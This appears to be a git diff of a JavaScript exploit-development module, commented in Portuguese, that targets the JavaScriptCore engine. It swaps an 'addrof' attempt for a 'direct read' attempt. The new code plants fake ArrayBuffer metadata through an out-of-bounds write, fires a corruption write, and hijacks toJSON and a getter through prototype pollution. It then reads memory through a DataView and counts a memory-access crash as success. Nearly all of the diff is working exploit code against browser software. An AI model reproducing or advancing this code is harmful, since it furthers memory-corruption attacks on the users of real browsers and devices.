@@ -11,22 +11,23 @@ import {
 } from '../core_exploit.mjs';
 import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';
 
-const GETTER_CHECKPOINT_PROPERTY_NAME = "AAAA_GetterForAddrOfTest"; // Novo nome para clareza
+const GETTER_CHECKPOINT_PROPERTY_NAME = "AAAA_GetterForDirectRead";
 let getter_called_flag = false;
-let current_test_results = { success: false, message: "Teste não iniciado.", leaked_info: null, error: null };
+let current_test_results = { success: false, message: "Teste não iniciado.", error: null };
 
-// Variável para o AB vítima "fresco"
-let fresh_victim_ab_for_addrof_test;
+// Metadados sombra
+const SHADOW_DATA_POINTER = new AdvancedInt64(0x1, 0x0);
+const SHADOW_SIZE = new AdvancedInt64(0x1000, 0x0); // 4096 bytes
 
-class CheckpointObjectForAddrOfTest {
+class CheckpointObjectForDirectRead {
     constructor(id) {
-        this.id = `AddrOfCheckpoint-${id}`;
+        this.id = `DirectReadCheckpoint-${id}`;
     }
 }
 
-export function toJSON_TriggerAddrOfTestGetter() {
-    const FNAME_toJSON = "toJSON_TriggerAddrOfTestGetter";
-    if (this instanceof CheckpointObjectForAddrOfTest) {
+export function toJSON_TriggerDirectReadGetter() {
+    const FNAME_toJSON = "toJSON_TriggerDirectReadGetter";
+    if (this instanceof CheckpointObjectForDirectRead) {
         logS3(`toJSON: 'this' é Checkpoint. Acessando getter '${GETTER_CHECKPOINT_PROPERTY_NAME}'...`, "info", FNAME_toJSON);
         try {
             // eslint-disable-next-line no-unused-vars
@@ -38,17 +39,14 @@ export function toJSON_TriggerAddrOfTestGetter() {
     return this.id;
 }
 
-// A função exportada mantém o nome para compatibilidade
-export async function executeRetypeOOB_AB_Test() {
-    const FNAME_TEST = "executeAddrOfSpeculativeTest"; // Nome interno do teste
-    logS3(`--- Iniciando Teste "AddressOf" Especulativo ---`, "test", FNAME_TEST);
+export async function executeRetypeOOB_AB_Test() { // Nome da função exportada mantido
+    const FNAME_TEST = "executeDirectReadAttemptTest"; // Nome interno
+    logS3(`--- Iniciando Teste de Leitura Direta Especulativa (ShadowCraft) ---`, "test", FNAME_TEST);
 
     getter_called_flag = false;
-    fresh_victim_ab_for_addrof_test = null;
-    current_test_results = { success: false, message: "Teste não executado ou getter não chamado.", leaked_info: null, error: null };
+    current_test_results = { success: false, message: "Teste não executado ou getter não chamado.", error: null };
 
-    // Validações de config... (simplificado para brevidade, assumindo que estão ok)
-    if (!JSC_OFFSETS.ArrayBufferContents) {
+    if (!JSC_OFFSETS.ArrayBufferContents || !JSC_OFFSETS.ArrayBuffer?.KnownStructureIDs?.ArrayBuffer_STRUCTURE_ID) {
         logS3("Offsets críticos não definidos. Abortando.", "critical", FNAME_TEST);
         current_test_results.message = "Offsets críticos não definidos.";
         return;
@@ -69,92 +67,60 @@ export async function executeRetypeOOB_AB_Test() {
         }
         logS3(`Ambiente OOB inicializado. oob_ab_len: ${oob_array_buffer_real.byteLength}`, "info", FNAME_TEST);
 
-        // 1. Escrita OOB "gatilho"
+        // 1. Plantar "Metadados Sombra" (ArrayBufferContents falsos)
+        //    no início do buffer de dados do oob_array_buffer_real.
+        const shadow_contents_offset_in_oob_data = 0x0;
+        oob_write_absolute(shadow_contents_offset_in_oob_data + JSC_OFFSETS.ArrayBufferContents.SIZE_IN_BYTES_OFFSET_FROM_CONTENTS_START, SHADOW_SIZE, 8);
+        oob_write_absolute(shadow_contents_offset_in_oob_data + JSC_OFFSETS.ArrayBufferContents.DATA_POINTER_OFFSET_FROM_CONTENTS_START, SHADOW_DATA_POINTER, 8);
+        logS3(`Metadados sombra plantados: ptr=${SHADOW_DATA_POINTER.toString(true)}, size=${SHADOW_SIZE.toString(true)}`, "info", FNAME_TEST);
+
+        // 2. Realizar a escrita OOB "gatilho"
         const corruption_trigger_offset_abs = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
         const corruption_value = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);
         oob_write_absolute(corruption_trigger_offset_abs, corruption_value, 8);
         logS3(`Escrita OOB gatilho em ${toHex(corruption_trigger_offset_abs)} do oob_data completada.`, "info", FNAME_TEST);
 
-        // 2. Criar um ArrayBuffer Vítima "Fresco" *APÓS* a escrita OOB gatilho
-        const victim_ab_size = 32; // Tamanho pequeno para facilitar a observação
-        logS3(`Criando ArrayBuffer vítima "fresco" (fresh_victim_ab_for_addrof_test) com tamanho ${victim_ab_size}...`, "info", FNAME_TEST);
-        fresh_victim_ab_for_addrof_test = new ArrayBuffer(victim_ab_size);
-        // Escrever alguns valores conhecidos nele
-        try {
-            new DataView(fresh_victim_ab_for_addrof_test).setUint32(0, 0x41414141, true);
-            new DataView(fresh_victim_ab_for_addrof_test).setUint32(4, 0x42424242, true);
-        } catch (e) { logS3("Erro ao preencher AB vítima fresco.", "error", FNAME_TEST); }
-        logS3(`fresh_victim_ab_for_addrof_test criado. byteLength inicial: ${fresh_victim_ab_for_addrof_test?.byteLength}`, "info", FNAME_TEST);
-
-
         // 3. Configurar o getter e poluir
-        const checkpoint_obj = new CheckpointObjectForAddrOfTest(1);
-        originalGetterDesc = Object.getOwnPropertyDescriptor(CheckpointObjectForAddrOfTest.prototype, GETTER_CHECKPOINT_PROPERTY_NAME);
+        const checkpoint_obj = new CheckpointObjectForDirectRead(1);
+        originalGetterDesc = Object.getOwnPropertyDescriptor(CheckpointObjectForDirectRead.prototype, GETTER_CHECKPOINT_PROPERTY_NAME);
 
-        Object.defineProperty(CheckpointObjectForAddrOfTest.prototype, GETTER_CHECKPOINT_PROPERTY_NAME, {
+        Object.defineProperty(CheckpointObjectForDirectRead.prototype, GETTER_CHECKPOINT_PROPERTY_NAME, {
             get: function() {
                 getter_called_flag = true;
-                const FNAME_GETTER = "AddrOfTest_Getter";
-                logS3(`Getter "${GETTER_CHECKPOINT_PROPERTY_NAME}" FOI CHAMADO! Tentando addrof especulativo...`, "vuln", FNAME_GETTER);
-                current_test_results = { success: false, message: "Getter chamado, teste addrof em andamento.", leaked_info: null, error: null };
-
-                let target_obj_for_addrof = fresh_victim_ab_for_addrof_test; // Ou oob_array_buffer_real
-                if (!target_obj_for_addrof) {
-                    logS3("DENTRO DO GETTER: Objeto alvo para addrof (fresh_victim_ab_for_addrof_test) é null!", "error", FNAME_GETTER);
-                    current_test_results.message = "Objeto alvo para addrof era nulo.";
-                    return 0xDEAD;
-                }
-
-                logS3(`DENTRO DO GETTER: Objeto alvo para addrof: ${Object.prototype.toString.call(target_obj_for_addrof)}, byteLength: ${target_obj_for_addrof.byteLength}`, "info", FNAME_GETTER);
+                const FNAME_GETTER = "DirectRead_Getter";
+                logS3(`Getter "${GETTER_CHECKPOINT_PROPERTY_NAME}" FOI CHAMADO! Tentando leitura direta especulativa...`, "vuln", FNAME_GETTER);
+                current_test_results = { success: false, message: "Getter chamado, teste de leitura direta em andamento.", error: null };
 
                 try {
-                    // Tentativa 1: Alguma propriedade foi corrompida para se tornar um número (ponteiro)?
-                    // Iterar sobre as propriedades e ver se alguma parece um endereço (grande número).
-                    // Isso é muito improvável de funcionar diretamente no JS.
-                    for (const key in target_obj_for_addrof) {
-                        try {
-                            const val = target_obj_for_addrof[key];
-                            if (typeof val === 'number' && (val > 0x100000000 || val < -0x100000000)) { // Heurística para um possível endereço
-                                logS3(`DENTRO DO GETTER: Propriedade suspeita '${key}' em target_obj: ${toHex(val, 64)}`, "leak", FNAME_GETTER);
-                                current_test_results.leaked_info = `Propriedade '${key}': ${toHex(val, 64)}`;
-                                current_test_results.success = true; // Sucesso especulativo
-                            }
-                        } catch (e_prop) { /* ignorar erros de acesso a propriedades estranhas */ }
-                    }
+                    logS3(`DENTRO DO GETTER: Criando 'new DataView(oob_array_buffer_real)'...`, "info", FNAME_GETTER);
+                    const dv = new DataView(oob_array_buffer_real);
+                    logS3(`DENTRO DO GETTER: DataView criada. dv.byteLength reportado: ${dv.byteLength}. Tentando dv.getUint32(0, true)... (Esperando erro se lê de ${SHADOW_DATA_POINTER.toString(true)})`, "info", FNAME_GETTER);
+                    
+                    // A tentativa crítica: ler do offset 0.
+                    // Se os metadados sombra (data_ptr=0x1) foram usados para o *acesso* aos dados,
+                    // esta leitura tentará acessar o endereço 0x1 e deveria causar um erro.
+                    let val_read = dv.getUint32(0, true);
 
-                    // Tentativa 2: Tentar forçar conversão para string ou número de uma forma que possa vazar.
-                    // Se target_obj_for_addrof (um ArrayBuffer) foi corrompido para ser, por exemplo, um JSString contendo um endereço,
-                    // ou se seu método toString foi alterado.
-                    const stringified_target = String(target_obj_for_addrof);
-                    logS3(`DENTRO DO GETTER: String(target_obj_for_addrof) = "${stringified_target}"`, "info", FNAME_GETTER);
-                    if (stringified_target.toLowerCase().includes("0x")) { // Heurística muito fraca
-                        current_test_results.leaked_info = `String(target_obj) suspeita: ${stringified_target}`;
-                         // Não marcar como sucesso ainda, muito fraco
-                    }
-
-
-                    // Tentativa 3: Interagir com o butterfly (se aplicável e se pudermos acessá-lo)
-                    // Esta é a parte mais difícil e geralmente requer uma primitiva de leitura arbitrária já estabelecida.
-                    // Sem isso, só podemos observar o comportamento externo.
-                    // Por exemplo, se target_obj_for_addrof fosse um Array e seu butterfly fosse corrompido para conter
-                    // o ponteiro da Structure como um elemento.
-                    if (Array.isArray(target_obj_for_addrof)) {
-                        if (target_obj_for_addrof.length > 0 && typeof target_obj_for_addrof[0] === 'number' && target_obj_for_addrof[0] > 0x100000) {
-                            logS3(`DENTRO DO GETTER: Primeiro elemento do array alvo (se for array) é um número grande: ${toHex(target_obj_for_addrof[0], 64)}`, "leak", FNAME_GETTER);
-                            current_test_results.leaked_info = `Array[0]: ${toHex(target_obj_for_addrof[0], 64)}`;
-                            current_test_results.success = true;
-                        }
-                    }
-
-
-                    if (!current_test_results.success) {
-                        current_test_results.message = "Nenhum vazamento de endereço óbvio ou corrupção útil observada no getter.";
-                    }
+                    // Se chegarmos aqui, a leitura de 0x1 NÃO causou um erro visível ao JS.
+                    // Isso significa que os metadados sombra não foram usados para o ponteiro de dados,
+                    // ou 0x1 é (improvavelmente) um endereço legível que contém 'val_read'.
+                    logS3(`DENTRO DO GETTER: LEITURA INESPERADA BEM-SUCEDIDA! dv.getUint32(0, true) retornou: ${toHex(val_read)}. dv.byteLength: ${dv.byteLength}`, "error", FNAME_GETTER);
+                    current_test_results = { success: false, message: `Leitura direta especulativa NÃO causou erro. Lido ${toHex(val_read)}. ByteLength: ${dv.byteLength}.`, error: null };
 
                 } catch (e) {
-                    logS3(`DENTRO DO GETTER: ERRO durante tentativa de addrof especulativo: ${e.message}`, "error", FNAME_GETTER);
-                    current_test_results.error = String(e);
-                    current_test_results.message = `Erro no getter: ${e.message}`;
+                    logS3(`DENTRO DO GETTER: ERRO durante DataView ou getUint32: ${e.message}`, "error", FNAME_GETTER);
+                    // Verificar se o erro é o esperado (RangeError, erro de acesso à memória)
+                    // indicando que tentou ler de um endereço inválido como 0x1.
+                    if (String(e.message).toLowerCase().includes("rangeerror") || 
+                        String(e.message).toLowerCase().includes("memory access out of bounds") ||
+                        String(e.message).toLowerCase().includes("segmentation fault") ||
+                        String(e.message).toLowerCase().includes("bus error") || // Outro possível erro de acesso
+                        String(e.message).toLowerCase().includes("bad access")) {
+                        logS3(`DENTRO DO GETTER: SUCESSO ESPECULATIVO! O erro '${e.message}' é CONSISTENTE com a tentativa de ler de ${SHADOW_DATA_POINTER.toString(true)}!`, "vuln", FNAME_GETTER);
+                        current_test_results = { success: true, message: `Leitura direta especulativa causou CRASH CONTROLADO esperado ('${e.message}') ao tentar ler de ${SHADOW_DATA_POINTER.toString(true)}.`, error: String(e) };
+                    } else {
+                        current_test_results = { success: false, message: `Erro inesperado na leitura direta: ${e.message}`, error: String(e) };
+                    }
                 }
                 return 0xBADF00D;
             },
@@ -163,7 +129,7 @@ export async function executeRetypeOOB_AB_Test() {
         getterPollutionApplied = true;
 
         originalToJSONProtoDesc = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_val);
-        Object.defineProperty(Object.prototype, ppKey_val, {value: toJSON_TriggerAddrOfTestGetter, writable: true, enumerable: false, configurable: true});
+        Object.defineProperty(Object.prototype, ppKey_val, {value: toJSON_TriggerDirectReadGetter, writable: true, enumerable: false, configurable: true});
         toJSONPollutionApplied = true;
         logS3(`Poluições aplicadas.`, "info", FNAME_TEST);
 
@@ -181,22 +147,21 @@ export async function executeRetypeOOB_AB_Test() {
     } finally {
         // Restauração
         if (toJSONPollutionApplied && Object.prototype.hasOwnProperty(ppKey_val)) { delete Object.prototype[ppKey_val]; if(originalToJSONProtoDesc) Object.defineProperty(Object.prototype, ppKey_val, originalToJSONProtoDesc); }
-        if (getterPollutionApplied && CheckpointObjectForAddrOfTest.prototype.hasOwnProperty(GETTER_CHECKPOINT_PROPERTY_NAME)) { delete CheckpointObjectForAddrOfTest.prototype[GETTER_CHECKPOINT_PROPERTY_NAME]; if(originalGetterDesc) Object.defineProperty(CheckpointObjectForAddrOfTest.prototype, GETTER_CHECKPOINT_PROPERTY_NAME, originalGetterDesc); }
+        if (getterPollutionApplied && CheckpointObjectForDirectRead.prototype.hasOwnProperty(GETTER_CHECKPOINT_PROPERTY_NAME)) { delete CheckpointObjectForDirectRead.prototype[GETTER_CHECKPOINT_PROPERTY_NAME]; if(originalGetterDesc) Object.defineProperty(CheckpointObjectForDirectRead.prototype, GETTER_CHECKPOINT_PROPERTY_NAME, originalGetterDesc); }
         logS3("Limpeza finalizada.", "info", "CleanupFinal");
     }
 
     if (getter_called_flag) {
         if (current_test_results.success) {
-            logS3(`RESULTADO TESTE ADDRSPEC: ${current_test_results.message} LEAK: ${current_test_results.leaked_info}`, "vuln", FNAME_TEST);
+            logS3(`RESULTADO LEITURA DIRETA: ${current_test_results.message}`, "vuln", FNAME_TEST);
         } else {
-            logS3(`RESULTADO TESTE ADDRSPEC: Getter chamado, mas sem sucesso. ${current_test_results.message}`, "warn", FNAME_TEST);
+            logS3(`RESULTADO LEITURA DIRETA: Getter chamado, mas sem sucesso. ${current_test_results.message}`, "warn", FNAME_TEST);
         }
     } else {
-        logS3("RESULTADO TESTE ADDRSPEC: Getter NÃO foi chamado.", "error", FNAME_TEST);
+        logS3("RESULTADO LEITURA DIRETA: Getter NÃO foi chamado.", "error", FNAME_TEST);
     }
     logS3(`  Detalhes finais: ${JSON.stringify(current_test_results)}`, "info", FNAME_TEST);
 
     clearOOBEnvironment();
-    fresh_victim_ab_for_addrof_test = null; // Limpa a referência global
-    logS3(`--- Teste "AddressOf" Especulativo Concluído ---`, "test", FNAME_TEST);
+    logS3(`--- Teste de Leitura Direta Especulativa Concluído ---`, "test", FNAME_TEST);
 }
